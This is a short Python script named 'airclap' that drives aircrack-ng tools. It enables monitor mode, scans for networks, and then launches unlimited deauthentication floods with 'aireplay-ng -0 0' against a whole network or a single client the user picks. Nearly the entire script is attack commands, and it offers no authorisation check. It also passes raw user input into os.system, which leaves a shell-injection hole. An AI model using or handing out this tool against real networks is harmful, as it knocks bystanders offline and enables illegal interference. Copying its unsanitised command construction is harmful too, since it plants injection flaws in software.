import os
print ("airclap, Created by Josiah Crofton, All Rights Reserved!")
os.system("git pull")
print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
os.system("airmon-ng start wlan0")
os.system("airodump-ng wlan0mon")
x = raw_input("Enter the bssid that you want to CLAP!:")
e = raw_input("Enter the channel of the network you wanna CLAP!:")
os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (e, x))
aireplay = raw_input("Do you want to clap the entire network or just a client? Network/Client:")
if aireplay == 'Network':
  os.system("aireplay-ng -0 0 -a %s wlan0mon" % x)
else:
  aireplay_client = raw_input("Enter the client you want to CLAP:")
  os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (x, aireplay_client))
print ("AirClap, Created by Josiah Crofton, All Rights Reserved!")
